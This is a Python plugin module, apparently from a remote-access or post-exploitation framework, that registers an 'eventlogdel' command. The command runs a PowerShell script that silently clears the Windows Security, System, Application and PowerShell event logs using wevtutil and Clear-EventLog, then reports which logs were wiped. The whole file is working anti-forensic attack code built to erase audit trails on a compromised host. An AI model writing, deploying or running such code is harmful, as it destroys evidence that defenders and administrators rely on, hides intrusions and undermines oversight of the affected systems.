"""Windows event log clearing via native event log management."""

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..shared.common import format_eventlogdel_report
from ..shared.runner import run_collector_plugin


def build_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$logs=@(
  'Security',
  'System',
  'Application',
  'Microsoft-Windows-PowerShell/Operational',
  'Windows PowerShell'
)
$cleared=@(); $failed=@()
foreach($log in $logs){{
  $ok=$false; $err=''
  try{{
    $p=Start-Process -FilePath 'wevtutil.exe' -ArgumentList @('cl',$log) -Wait -PassThru -NoNewWindow -EA Stop
    if($p.ExitCode -eq 0){{ $ok=$true }}
    else {{ $err="wevtutil exit code $($p.ExitCode)" }}
  }}catch{{ $err=$_.Exception.Message }}
  if(-not $ok){{
    try{{
      Clear-EventLog -LogName $log -EA Stop
      $ok=$true; $err=''
    }}catch{{
      if(-not $err){{ $err=$_.Exception.Message }}
    }}
  }}
  if($ok){{ $cleared+=$log }} else {{ $failed+=@{{log=$log;error=($err -replace '\s+',' ').Trim()}} }}
}}
$result=[ordered]@{{
  summary=@{{Requested=$logs.Count;Cleared=$cleared.Count;Failed=$failed.Count}}
  cleared=$cleared
  failed=$failed
  message=if($cleared.Count){{'Event logs cleared using wevtutil/Clear-EventLog'}}else{{'No event logs were cleared (administrator privileges may be required for Security)'}}
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


@plugin.command(
    name='eventlogdel',
    platforms=['windows'],
    description='Clear Windows Event Logs (Security, System, Application, PowerShell)',
)
def run(session: SessionContext, args):
    session.log_event('Plugin eventlogdel: clear started')
    session.print(
        'Clearing Windows event logs (Security log typically requires administrator privileges).',
        'yellow',
    )
    return run_collector_plugin(
        session,
        'eventlogdel',
        None,
        build_command,
        format_eventlogdel_report,
        timeout=60.0,
    )
